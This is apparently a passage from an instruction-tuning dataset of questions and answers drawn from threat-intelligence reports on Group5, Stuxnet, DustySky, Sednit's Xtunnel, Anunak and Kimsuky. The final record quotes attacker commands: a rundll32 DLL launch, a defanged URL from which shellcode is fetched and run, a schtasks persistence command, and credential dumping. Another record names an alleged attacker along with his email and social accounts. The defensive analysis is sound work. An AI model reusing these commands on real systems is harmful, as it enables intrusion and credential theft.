methods they used to conceal and operate this malware?",
    "output": "The Syrian Electronic Army and pro-government groups utilized proficient social engineering tricks to deliver malware by tricking and tempting victims into opening and exploring malicious files. These malware files were distributed through various platforms including hacked activist sites, web pages, and social networking forums. The malware employed new but not advanced techniques to hide and operate, making it effective enough to infiltrate systems without requiring sophisticated methods. This approach highlights the importance of user awareness and education in defending against such cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Stuxnet malware utilize rootkit functionality to remain undetected on infected systems?",
    "output": "Rootkits are programs designed to hide the existence of malware by intercepting and modifying operating system API calls that supply system information. In the case of the Stuxnet malware, it employs rootkit functionality to conceal its presence on infected systems. Specifically, Stuxnet uses a Windows rootkit to hide its files, network connections, and other system components. The rootkit intercepts and modifies operating system API calls, making it difficult for system administrators to detect the malware's presence. Furthermore, Stuxnet's rootkit functionality resides at the kernel level, allowing it to manipulate system information and remain undetected. The malware also utilizes a PLC rootkit to hide its code on programmable logic controllers (PLCs), further demonstrating its sophisticated use of rootkit technology. Overall, Stuxnet's use of rootkit functionality enables it to maintain a stealthy presence on infected systems, making it challenging for defenders to detect and mitigate the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThis report describes an elaborately staged malware operation with targets in the Syrian opposition. The operators use a range of techniques to target Windows computers and Android phones with the apparent goal of penetrating the computers of well-connected individuals in the Syrian opposition.\nWe first discovered the operation in late 2015 when a member of the Syrian opposition spotted a suspicious e-mail containing a PowerPoint slideshow. From this initial message, we uncovered a watering hole website with malicious programs, malicious PowerPoint files, and Android malware, all apparently designed to appeal to members of the opposition.\nElements of the Syrian opposition have been targeted by malware campaigns since the early days of the conflict: regime-linked malware groups, the Syrian Electronic Army, ISIS, and a group linked to Lebanon reported by FireEye in 2015 have all attempted to penetrate opposition computers and communications. Some of these operations are still active as of the time of writing. This report adds one more threat actor to the list: Group5, which we name to reflect the four other known malware groups.\nGroup5 stands out from the operations that have already been reported on: some of the tactics and tools used have not been observed in this conflict; the operators seem comfortable with Iranian Persian dialect tools and Iranian hosting companies; and they appear to have run elements of the operation from Iranian IP space.\nLike a chameleon, Group5 borrows opposition text and slogans for e-mail messages and watering holes, showing evidence of good social engineering and targeting. However, Group5's technical quality is low, and their operational security uneven. This is a common feature of many operations in the Syrian context: since the baseline security of many of the targets is very low, many successful threat actors seem to conserve (and in some cases not possess) more sophisticated techniques. We believe we identified Group5 early in its lifecycle, before all of the malware that had been staged and prepared could be deployed in a full campaign.\nOur analysis indicates that Group5 is likely a new entrant in Syria, and we outline the circumstantial evidence pointing to an Iranian nexus. We do not conclusively attribute Group5 to a sponsor, although we suspect the interests of a state are present, in some form. Group5 is just the latest addition to an expanding cast of actors targeting Syrian opposition groups, and its entry into the conflict shows the continuing information security risks that they face.\nBig Headline: Regime-Linked Groups\nThe most well-known threat actor to target the Syrian Revolution is the Syrian Electronic Army (SEA). However, many of the targets of the SEA have been Western organizations, although the SEA continues to conduct lower-profile operations that include malware against the opposition. Less notorious, although still the subject of reporting, are malware groups linked to the regime. These malware groups have been active since 2011, and have used a wide range of Commercial-Off-The-Shelf (COTS) Remote Access Trojans (RATs) to target the opposition. Typically, these groups bundle RATs with a wide range of documents and programs designed to appeal to the opposition. Over the years, these campaigns have included everything from \"revolution plans,\" lists of \"wanted suspects,\" to fake security and encryption tools. These campaigns have been extensively characterized by reports from the Citizen Lab, The Electronic Frontier Foundation, and private companies like TrendMicro and Kaspersky. A range of reports have documented these regime-linked campaigns over the years.\nBig Headline: Pro-Regime Groups Outside Syria\nThere is also evidence of pro-Assad groups outside Syria participating in malware campaigns against opposition. Notably, (<https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-behind-the-syria-conflict.pdf>)a group reported on in 2015 by FireEye (in collaboration with one of the authors of this report) used female avatars to send trojaned documents to high profile figures in opposition politics, aid, and armed groups. The operation yielded over 31,000 conversations, and a trove of sensitive information about a variety of groups' plans and activities. This group also made use of fake matchmaking websites and social media accounts to backstop their deception.\nBig Headline: ISIS-Linked Groups\nOn a different side of conflict, the Citizen Lab (<https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/>)documented a malware operation linked to ISIS against the group 'Raqqa is Being Slaughtered Silently' (RBSS) in 2015. The operators, masquerading as a group of RBSS sympathizers based in Canada, targeted victims with a file that claimed to contain locations of ISIS forces and US Airstrikes within Syria. The file actually contained custom malware that collected and transmitted information about the infected computer. The report concluded that there was strong circumstantial evidence linking the malware to members of ISIS.\nBig Headline: Many Groups, Similar Tactics\nEach of these groups has distinct Tactics, Techniques and Procedures (TTPs). However, one common thread among the many publicly-reported groups is that they rarely use exploits in their campaigns, instead relying heavily on social engineering and trickery to convince targets to execute malicious files, disguised as innocuous documents.\nThis may reflect some of these groups' lack of technical sophistication. For example, many regime-linked groups seem to have very limited skills and technical resources, and rely almost entirely on RATs coupled with well-informed social engineering. These techniques have evolved, but not improved radically since 2011. In other cases, such as the Lebanon-linked group reported on by FireEye, operators may have access to more sophisticated techniques, but see little reason to use them against their targets, given the limited technical capabilities of the opposition.\nBig Headline: Part 1: Discovering Group5\nThis section describes the e-mails that first alerted us to an operation targeting the Syrian political opposition in October 2015.\nOn October 3rd 2015, Noura Al-Ameer, a well-connected Syrian opposition political figure, negotiator, and former Vice President of the opposition Syrian National Council (SNC), received a suspicious e-mail.The e-mail purported to come from a human rights documentation organization she had never heard of: \"Assad Crimes.\" The sender, using the e-mail address office@assadcrimes[.]info claimed to be sharing information about Iranian \"crimes,\" a theme familiar to many in the opposition.\nFig. 1: Noura Al-Ameer, former SNC Vice President and a target of the operation. An activist from Homs, Syria, Al-Ameer was detained and tortured in the security branches, later moved to the infamous Adra prison in Damascus, prior to fleeing the country several years ago. Today, she is a delegate to the SNC's political council and works to document war crimes committed during the conflict. Her identity was falsely used to register the assadcrimes website.\nInterestingly, Al-Ameer's own name was used in the assadcrimes[.]info domain registration, along with other false information (we speculate on the reason for using her name in (<https://citizenlab.org/2016/08/group5-syria/#part6>)Part 6: Analysis of Competing Hypotheses).\nAlong with a brief pretext in the Subject and Body, the e-mail also contains an attached Microsoft PowerPoint Slideshow (PPSX) document that, when clicked, directly opens and runs a PowerPoint slideshow.\nMedium Headline: E-mail 1: The Initial Message (Dropper Doc 1)\nOn October 3rd 2015, Al-Ameer received the initial e-mail message, containing the first malicious file:\nTranslation:\nFrom: office@assadcrimes[.]info\nTo:\nSubject: Iran is killing the Pilgrims in Mina\nBody: Iran's Crimes in the Kingdom of Saudi Arabia\nExamination of the header of the message indicates that the message was sent via 88.198.222[.]163, the same IP address as the Command & Control (C2) for the malware dropped by the file (See (<https://citizenlab.org/2016/08/group5-syria/#part3>)Part 3: Windows Malware).\nAssadcrimes.ppsx\nMD5 : 76F8142B4E52C671871B3DF87F10C30C\nSmall Headline: Bait Content: Syria and Iran-Themed PowerPoint Slideshows\nThe PPSX documents (assadcrimes.ppsx & assadcrimes1.ppsx) contain a series of images and Arabic text, including cartoons and photographs describing politically sensitive events, such as aggressions launched by Iran against Saudi Arabia, and the politics surrounding the current Syrian conflict. The documents also provide a historical overview of Iranian-linked \"attacks\" and other events in the Kingdom of Saudi Arabia.\nTranslation:\nOn 1404 A.H \u2013 1984 A.D Iranian warship attacked Saudi Arabia\nOn 1404 A.H, two Iranian war planes headed to Jubail industrial city, to bomb and hit critical factories (Petrochemical factory) and by god's well, the Saudi's air forces was able to hit one plane, while the other managed to escape.\n\nAnswer this question based on the above context: What are the key characteristics of the malware campaigns conducted by regime-linked groups targeting the Syrian opposition? How have these campaigns evolved over time?",
    "output": "Regime-linked malware groups have been active since 2011 and have used a wide range of Commercial-Off-The-Shelf (COTS) Remote Access Trojans (RATs) bundled with documents and programs designed to appeal to the opposition. These campaigns have included various themes such as 'revolution plans,' lists of 'wanted suspects,' and fake security and encryption tools. While the techniques have evolved, they have not improved radically since 2011, indicating a reliance on social engineering rather than advanced technical methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: TREND MICRO LEGAL DISCLAIMER\nThe information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.\nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes.\nAlthough Trend Micro uses reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information constitutes acceptance for use in an \"as is\" condition.\nQ: Why is it crucial for cybersecurity experts to understand the legal implications and limitations of the information provided in APT reports like the one from Trend Micro on the Netherlands Cyber Attack? How does this understanding help in dealing with similar attacks better?",
    "output": "It is crucial for cybersecurity experts to understand the legal implications and limitations of the information provided in APT reports because the information is intended for general education and may not cover all scenarios or reflect the most current situation. The report explicitly states that it is not legal advice and should not be relied upon without consulting legal professionals. Understanding these limitations helps experts to seek additional guidance when necessary and ensures they do not act solely based on the report, which could lead to legal complications. This awareness promotes a more thorough and legally sound approach to handling cyber threats, thereby improving the overall response strategy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat Actor and Attribution\nThe DustySky campaign has been going on for over a year, with more than 120 command and control hostnames, and dozens of known unique malware samples. However, it has not been technologically advanced, and the infrastructure and attacks have not been operated professionally.\nOpen directories were often left on delivery servers. Traces were left on infected systems and abused email accounts. Malware delivery was often predictable, contained spelling mistakes or even irrelevant lure documents, and were easy to identify. Most importantly, the attacker forgot to cover his trails, enabling us to learn his identity.\nMedium Headline: Threat actor\nIn the beginning of December 2015, three samples were submitted to online malware detection and analysis platforms malwr.com and Virus Total. The samples were Word documents with a macro version of DustySky. They were submitted on the same date they were last saved.\nThe person who last saved the documents (after weaponizing them with the malicious macro) forgot to clear the file metadata. Thus, the \"Last Saved By\" properties of the documents contained his username: moayy2ad@hotmail.com\nThe images below display this username in the samples metadata:\nInvoice details.doc (b1071ab4c3ef255c6ec95628744cfd3d), uploaded on 3 December 20154 and Invoice-Complete.doc (77d6e2068bb3367b1a46472b56063f10) uploaded on 2 December 20155\nGoogle-Privacy.doc (9c60fadece6ea770e2c1814ac4b3ae74) uploaded to VirusTotal on 3 December 20156\nMedium Headline: Who is moayy2ad@hotmail.com\nThe unique username moayy2ad enabled us to find plenty of information on the attacker. Googling for moayy2ad@hotmail.com led the following blog7, which has been removed in the months after we published the first report:\n7 mrayesh.blogspot[.]com\nThe blog was created by mo'ayyad on Blogger, who is also using the name mo'ayy. This profile has been made private following our publication.\nSearching for the same username in Gmail (moayy2ad@gmail.com) yielded further results. A Google+ profile8 with a similar nickname \u2013 Mo'ay - was connected to this address. The profile has also been disabled in the months after we published the first report.\n8 https://plus.google.com/u/1/115033746922297164649\nThe owner of the Gmail account has developed a flashlight app 9. In the app's page we learn that he uses the name Mo'ayyad Ay and that he is from Gaza\"\nIn the YouTube channel10 linked to moayy2ad@gmail.com (which, like the other accounts, has been made private later), the individual has uploaded anti-Israeli propaganda videos:\n9 https://play.google.com/store/apps/details?id=org.moayyad.aye.flash.app&hl=en\nAccording to the videos he watched it seems that he was learning development and hacking skills over the past few years:\nSimilarly, we found his Twitter account11 (also disabled) full name Moayyad Ayesh and Facebook account 12\n11 https://twitter.com/MoayyadAyesh\n12 https://www.facebook.com/profile.php?id=100012034095150\nWe also found this cached chat in Tor based chat service in which moayy2ad is talking about \"israil bnk acounts\" (we do not have the rest of the conversation).\nThe Gmail address is connected to a Facebook account, probably of a fake identity - Montaser Ali (https://www.facebook[.]com/montaser.ali.338).\nThe profile says that the actor resides in Nablus, and that he is a member of a group called \"Rebellion \u2013 West-Bank\"13 .\nSmall Headline: By Email\nEleven days after we publicly published \"Operation DustySky\", we received the following email\n13 https://www.facebook.com/%D8%AA%D9%85%D8%B1%D8%AF-%D8%A7%D9%84%D8%B6%D9%81%D8%A9-%D8%A7%D9%84%D8%BA%D8%B1%D8%A8%D9%8A%D8%A9-542062199177072/\nWe immediately recognized the email as a fake \u2013 coming from an unofficial address - idf.cyber@gmail.com \u2013 and written in English.\nThe email, allegedly sent by the \"Israeli Defense Force cyber team\", asked for undisclosed information we had about the culprit behind DustySky (the email referred to a statement in the first report in which we wrote that \"we have decided not to disclose this individual's name in the public report\").\nQ: How did the investigators manage to trace back the identity of the threat actor responsible for the DustySky campaign? Describe the steps and the evidence that led to the identification.",
    "output": "The investigators managed to trace back the identity of the threat actor through several steps involving the analysis of file metadata and online presence. First, three Word document samples containing a macro version of DustySky were submitted to online malware detection platforms. The 'Last Saved By' metadata in these documents revealed the username 'moayy2ad@hotmail.com'. This username was then used to search for additional information online. A blog created by 'mo'ayyad' on Blogger was found, which was later made private. Further searches using 'moayy2ad@gmail.com' led to a Google+ profile under the nickname 'Mo'ay', which was also disabled. The owner of the Gmail account developed a flashlight app, identifying himself as Mo'ayyad Ay from Gaza. Additionally, a YouTube channel linked to the Gmail account contained anti-Israeli propaganda videos and showed that the individual was learning development and hacking skills. Social media accounts on Twitter and Facebook were also discovered, along with a cached chat discussing 'israil bnk acounts'. The Gmail address was connected to a Facebook account under the name Montaser Ali, claiming to reside in Nablus and being part of a group called 'Rebellion \u2013 West-Bank'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Kimsuky group utilize Meterpreter in their APT attacks, and what are the differences between the Staged and Stageless methods they employ?",
    "output": "The Kimsuky group primarily uses the stager method for Meterpreter deployment. Instead of including Meterpreter directly in the distributed file, they include a shellcode that downloads a backdoor containing Meterpreter. Specifically, the downloaded file is metsrv.dll, the basic backdoor of Meterpreter, which is executed using the Reflective DLL injection method. This method allows the start address (beginning with MZ) to operate as code, loading the DLL file into memory and then handing over control to run the actual code of metsrv.dll. The Staged method involves distributing a small stager that downloads the main malware from the C&C server, while the Stageless method includes the main malware directly in the binary, allowing direct communication with the C&C server without needing to download additional components.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers behind the Stuxnet APT obtain code signing certificates to sign their malicious drivers?",
    "output": "Obtain Capabilities: Code Signing Certificates is a technique used by adversaries to acquire code signing certificates that can be used to sign malicious code, making it appear legitimate. In the case of the Stuxnet APT, the attackers obtained code signing certificates from two Taiwanese companies, Realtek Semiconductor Corp. and JMicron Technology Corp. The certificates were used to sign the malicious drivers, including MRXCLS.sys and jmidebs.sys. It is suspected that the attackers may have obtained the certificates through physical theft or by purchasing them from another source, possibly using a front organization or stolen information from a previously compromised entity. The use of code signing certificates in Stuxnet highlights the importance of securing these certificates and ensuring their authenticity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: TLS Encryption (April 2014)\nA major feature introduced in April 2014 is the encryption of the communications with the C&C server with the Transport Layer Security (TLS) protocol (<>)[25]. These new Xtunnel binaries are statically linked with OpenSSL 1.0.1e \u2014 a version released in February 2013. Inside the TLS encapsulation, Xtunnel network protocol for tunneling remains the same (including the RC4 encryption).\nThe TLS certificate used by the C&C server is not verified by Xtunnel, which means anyone could play the role of Xtunnel C&C server.\nSmall Headline: HTTP Proxy Connection (February 2015)\nSome organizations force their computers to pass through an HTTP proxy to access the Internet. Malware running on such machines therefore cannot contact the C&C server directly, but has to pass through the proxy. Sednit developers took that into account by creating special Xtunnel versions with HTTP proxy awareness.\nIn these binaries, Xtunnel first tries to retrieve the Internet Explorer proxy configuration by calling the Windows API function WinHttpGetIEProxyConfigForCurrentUser (<>)[26]. In the event that no information can be retrieved, it uses the hardcoded address 10.1.1.1:8080, which is the default address of the Squid caching proxy (<>)[27]. This intention is clearly stated in the PDB path in one of the samples: xaps_through_squid_default_proxy.\nOnce a proxy IP address has been chosen, Xtunnel uses the HTTP CONNECT method (<>)[28] to reach its C&C server.\nSmall Headline: Command Line Parameter Parser (April 2015)\nTo gain in flexibility and manage novel features, in April 2015 Xtunnel developers introduced a command line parameter parser. This parser accepts the parameters described in Table 5.\nTable 5. Xtunnel Parameters\nIn most Xtunnel samples, the parser actually processes a command line hardcoded in the binary, without even looking for input parameters. Here are some examples of such command lines found in some samples:\nThe proxy IP addresses shown in these examples do not correspond to any known default proxy address, indicating that these binaries were likely compiled for specific targets.\nSmall Headline: HTTP Persistent Connection (June 2015)\nIn June 2015, a novel way to connect to the C&C server was introduced: an HTTP persistent connection (<>)[29]. When this feature is enabled, Xtunnel exchanges data with its C&C server over the HTTP protocol (encapsulated in TLS protocol), probably as a way to bypass firewalls.\nTo open such a persistent connection, an HTTP GET request is encapsulated in TLS protocol and sent to the C&C server. This request comes with the HTTP header Connection: keep-alive to enable the persistent connection.\nAnother HTTP request header hardcoded in Xtunnel is Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4, which interestingly contains the language code ru-RU. This header may have been copied from a request made from a computer whose default language is Russian.\nSmall Headline: Code Obfuscation (July 2015)\nIn July 2015, Xtunnel binaries changed drastically from a syntactic point of view, due to the introduction of code obfuscation. This obfuscation was applied only to Xtunnel-specific code, while statically linked libraries were left untouched. The method employed is a mix of classic obfuscation techniques, like insertion of junk code and opaque predicates (<>)[30].\nConsequently, Xtunnel binaries are now about 2 MB in size, while the previous non-obfuscated versions were about 1 MB with most of that being the statically linked OpenSSL library. The obfuscated version is, of course, much harder to understand and, to illustrate that, the following Figures show the control flow graph (CFG) (<>)[31] of a small Xtunnel function, before and after obfuscation.\nWhile the control flow has been heavily obfuscated, strangely the strings and data are kept in plain text. We speculate that the developers applied an (unknown) code obfuscation tool, which was enough to achieve their goal \u2014 probably bypassing some security products.\nMedium Headline: Conclusion and Open Questions\nWe believe Xtunnel to be of high importance to the Sednit operators, despite the questionable quality of the code as we discussed in the analysis. In particular, it is the only Sednit component we know with heavy code obfuscation. Additionally, the numerous features added over the last three years indicate an ongoing development effort.\nFinally, we would like to stress that our analysis is solely based on the capabilities found in the binaries. In particular, we do not have in-the-wild examples on how Xtunnel is deployed, and what kind of network traffic is usually forwarded.\nBig Headline: ClOSInG REMaRkS\nIn order to perform its espionage activities, the Sednit group mainly relies on two backdoors, Xagent and Sedreco, which were intensively developed over the past years. Similarly, notable effort has been invested into Xtunnel, in order to pivot in a stealthy way. Overall, these three applications should be a primary focus to anyone wanting to understand and detect the Sednit group's activities.\nNevertheless, the spying and pivoting capabilities of Sednit are not limited to the software described in this second part of our whitepaper. For example, they regularly deploy the following on target computers:\n\u2022 Password retrieval tools for browsers and email clients; some of these tools are custom, while others are publicly available (like the SecurityXploded tools (<>)[32])\n\u2022 Windows password retrieval tools, with custom builds of the infamous mimikatz (<>)[33] and some custom tools\n\u2022 A custom tool to take regular screenshots of the target computer\nMoreover, the Sednit group created numerous small executables to perform specific tasks, like copying or removing files. The developers seem therefore to closely follow the operational needs of the group, causing us to speculate that they are not outsiders paid for a one-time job, but fully-fledged members of the group.\nBig Headline: REfEREnCES\n1. The Washington Post, Russian government hackers penetrated DNC, stole opposition research on Trump, (<https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html?hpid=hp_rhp-banner-main_dnc-hackers-1145a-banner%3Ahomepage%2Fstory,>), June 2016\n2. The Wall Street Journal, Germany Points Finger at Russia Over Parliament Hacking Attack, , May 2016\n3. Reuters, France probes Russian lead in TV5Monde hacking: sources, -france-russia-cybercrime-idUSKBN0OQ2GG20150610, June 2015\n4. ESET VirusRadar, Zero-day, -day\n5. ESET, Sednit Espionage Group Attacking Air-Gapped Networks, , November 2014\n6. Kaspersky, Sofacy APT hits high profile targets with updated toolset, -apt-hits-high-profile-targets-with-updated-toolset/, December 2015\n7. CrowdStrike, Bears in the Midst: Intrusion into the Democratic National Committee, -midst-intrusion-democratic-national-committee/, June 2016\n8. Trend Micro, Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT, , October 2014\n9. FireEye, APT28: A Window into Russia's Cyber Espionage Operations?,\n10. GitHub, ESET Indicators of Compromises,\n11. ESET, Sednit espionage group now using custom exploit kit, , October 2014\n12. Microsoft Developer Network, Run-Time Type Information,\n13. Trend Micro, Pawn Storm Update: iOS Espionage App Found, -storm-update-ios-espionage-app-found/, February 2015\n14. 15. SQLite, SQLite, /\n16. Wikipedia, Cyclic redundancy check,\n17. W3C, The Multipart Content-Type,\n18. Microsoft Developer Network, How to Implement Icon Overlay Handlers, (v=vs.85).aspx\n19. Microsoft Developer Network, SYSTEMTIME structure, (v=vs.85).aspx\n20. Wikipedia, Lempel\u2013Ziv\u2013Welch, %E2%80%93Ziv%E2%80%93Welch\n21. 4coder, LZW Algorithm Implementation, /\n22. 23. Spiegel, Cyberangriff auf das Parlament: Bundestag best\u00e4tigt Abfluss von E-Mail-Daten, , June 2015\n24. PDB Files,\n25. Internet Engineering Task Force, The Transport Layer Security (TLS) Protocol,\n26. Microsoft Developer Network, WinHttpGetIEProxyConfigForCurrentUser function, (v=vs.85).aspx\n27. Squid, Home Page, /\n28. Wikipedia, HTTP CONNECT tunneling, #HTTP_CONNECT_tunneling\n29. Wikipedia, HTTP persistent connection,\n30. Wikipedia, Opaque predicate,\n31. Wikipedia, Control flow graph,\n32. SecurityXploded, Home Page, /\n33. mimikatz, GitHub page,\nLast updated 2016-09-07 19:38:00 EDT\n\nHow did the Sednit group modify Xtunnel in June 2015 to potentially bypass firewalls, and what additional clue did they leave behind regarding their possible origin?",
    "output": "A: In June 2015, the Sednit group introduced a feature in Xtunnel to establish an HTTP persistent connection with the C&C server. This connection is encapsulated in the TLS protocol and uses the HTTP GET request with the header 'Connection: keep-alive' to maintain the persistent connection, likely as a method to bypass firewalls. Additionally, another HTTP request header hardcoded in Xtunnel is 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4', which includes the language code 'ru-RU'. This suggests that the request might have been copied from a computer whose default language is Russian, providing a clue about the possible origin of the Sednit group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Foreword\nDustySky (called \"NeD Worm\" by its developer) is a multi-stage malware in use since May 2015. It is in use by the Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is intelligence gathering. Operating since 2012, the group's activity has been reported by Norman 1 , Kaspersky2,3, FireEye4, and PwC5.\nThis report revolves around a campaign that includes a new malware developed by a member of the group or on behalf of the group. Based on dozens of known attacks and the vast infrastructure in use - we estimate that a wave of targeted malicious email messages has been sent on a weekly basis.\nThese attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets rather than random mass distribution, but are not tailored specifically to each and every target. Dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic or English - depending on the target audience.\nTargeted sectors include governmental and diplomatic institutions, including embassies; companies from the aerospace and defence Industries; financial institutions; journalists; software developers.\nThe attackers have been targeting software developers in general, using a fake website pretending to be a legitimate iOS management software, and linking to it in an online freelancing marketplace.\nMost targets are from the Middle East: Israel, Egypt, Saudi Arabia, United Arab Emirates and Iraq. The United States and countries in Europe are targeted as well.\n\nHow does the DustySky malware, developed by the Molerats (Gaza cybergang), differ from traditional spear-phishing attacks in terms of target selection and message customization? Additionally, explain how this approach impacts the effectiveness and scope of their campaigns.",
    "output": "The DustySky malware, developed by the Molerats (Gaza cybergang), differs from traditional spear-phishing attacks in that it employs a targeted but not spear-phished approach. This means that malicious email messages are sent to selected targets rather than being distributed randomly en masse. However, unlike spear-phishing, these messages are not tailored specifically to each individual target. Instead, dozens of targets may receive the exact same message. The email message and the lure document are written in Hebrew, Arabic, or English, depending on the target audience. This approach allows the attackers to cast a wider net while still maintaining some level of specificity, potentially increasing the likelihood of success without the need for extensive personalization. By targeting multiple individuals with the same message, the attackers can efficiently reach a larger number of potential victims, making their campaigns more scalable and effective.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: execuTive summAry\nThis report describes the details and type of operations carried out by an organized criminal group that focuses on financial industry, such as banks and payment providers, retail industry and news, media and PR companies. The group has its origin in more common financial fraud including theft from consumer and corporate bank accounts in Europe and Russia, using standard banking malware, mainly Carberp.\nAfter the arrests of Carberp group members in Russia, some of the members were out of work, however, their experience gained from many years of crime has allowed them to enter a new niche. One of the members quickly realized that they can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort. The anti-fraud measures employed by banks has pushed the criminals to search for new ways to make money with less barriers, compromising and modifying or taking data from banks, payment providers, retail and media/ PR companies are some of these methods.\nFrom 2013 an organized criminal group intensified its activity focused on banks and electronic payment systems in Russia and in the post-Soviet space.\nThe key is that fraud occurs within the corporate network using internal payment gateways and internal banking systems. Thus money is stolen from the banks and payment systems, and not from their customers. While this is their main and most lucrative activity, the gang has also ventured into other areas including the compromise of media groups and other organizations for industrial espionage and likely a trading advantage on the stock market. In cases where the group got access to the government agency networks their aim was espionage related.\nThe organized criminal group backbone are citizens of both Russian and Ukrainian origin, but the group also sources a number of mainstream and specialized services from individuals and groups originating from Russia, Ukraine and Belarus.\nThe average sum of theft in the Russian territory and in the post-Soviet space is $2 million per incident. Since 2013 they have successfully gained access to networks of more than 50 Russian banks and 5 payment systems, and 2 of these institutions were deprived of their banking license. To date the total amount of theft is over 1 billion rubles (about 25 million dollars), most of it has been stolen in the second half of 2014.\nThe average time from the moment of penetration into the financial institutions internal network till successful theft is 42 days.\nAs a result of access to internal bank networks the attackers also managed to gain access to ATM management infrastructure and infect those systems with their own malicious software that further allows theft from the banks ATM systems on the attackers command.\nSince 2014 the organized criminal group members began actively taking an interest in US and European based retail organizations. While they were already familiar with POS malware and compromising POS terminals, the widespread media attention around the Target breach and other related breaches were the reason for this move. While the scale of breaches in this industry is still relatively low, with at least 3 successful card breaches and over a dozen retailers compromised this activity is quickly becoming a lucrative endeavor for this group.\nTo penetrate into the internal networks this organized criminal group employs targeted emailing (spear phishing) and infections sources from other botnets. This is the main reason why the group is\nkeeping in touch with owners of large botnets. Since August 2014 the group began to create their own large botnet using a mass emailing, but not using typical exploit driveby infections. This last move is likely to reduce the need for external contacts.\n\nQ: How did the Anunak APT group evolve from traditional financial fraud to targeting financial institutions directly, and what factors influenced this shift?",
    "output": "A: The Anunak APT group initially engaged in traditional financial fraud, such as stealing from consumer and corporate bank accounts using banking malware like Carberp. After the arrests of Carberp group members, some members leveraged their extensive criminal experience to target financial institutions directly. This shift was driven by the realization that stealing larger sums in fewer transactions could yield significant profits with less effort. Additionally, the increasing anti-fraud measures employed by banks pushed the criminals to seek new methods, including compromising and modifying data from banks, payment providers, retail, and media/PR companies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: January 17, 2022\ne31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba -csidl_profile\\appdata\\local\\microsoft\\windows\\inetcache\\ie\\3tygrjkm\\join_06[1].htm\nThe HTM file is copied to a DLL file:\nrundll32.exe CSIDL_PROFILE\\public\\scskapplink.dll,netsetcookie Cnusrmgr\nThis DLL file is injected into the legitimate system management software INISAFE Web EX Client. The file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added.\n01:02 \u2013 The file is run and downloads and executes a backdoor payload (final.cpl -5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\".\nThe file final.cpl is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added (AppMgmt).\nThe malware connects to, downloads, decodes, and executes shellcode from the following remote location:\nhxxp[:]//happy[.]nanoace.co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp\n01:04 \u2013 Another CPL file\n(61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4) is executed. This file, again, is a Trojanized version of LZMA Utils with a malicious added export.\n01:13 \u2013 The shellcode loader (final.cpl) is executed again several times.\n01:38 \u2013 Commands are executed to dump credentials from the SAM and SYSTEM registry hives.\nOver the next several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect the dumped system hives, among other things.\n06:41 \u2013 The attackers create a scheduled task to ensure persistence between system reboots:\nschtasks /create /RU [REDACTED].help\\175287 /ST 15:42 /TR \"cmd.exe /c C:\\ProgramData\\Intel\\Intel.bat\" /tn arm /sc MINUTE\nThe scheduled task instructs the system to execute 'Intel.bat' as user '[REDACTED].help/175287' starting at 15:42 then every minute under the scheduled task name 'arm'. It's unclear if this was an account that was cracked via the dumped registry hives or an account the attackers were able to create with admin rights.\nThe attackers were also observed installing Cryptodome (PyCrypto fork) Python encryption modules via CPL files.\nA clean installation of BitDefender was also installed by the attackers. While unconfirmed, the threat actors may have installed an older version of this software (from 2020) with a (<https://www.bleepingcomputer.com/news/security/bitdefender-fixes-bug-allowing-attackers-to-run-commands-remotely/>)vulnerability that allowed attackers to run arbitrary commands remotely.\nMedium Headline: January 18\n00:21 \u2013 The final.cpl file is executed again.\n00:49 \u2013 A new 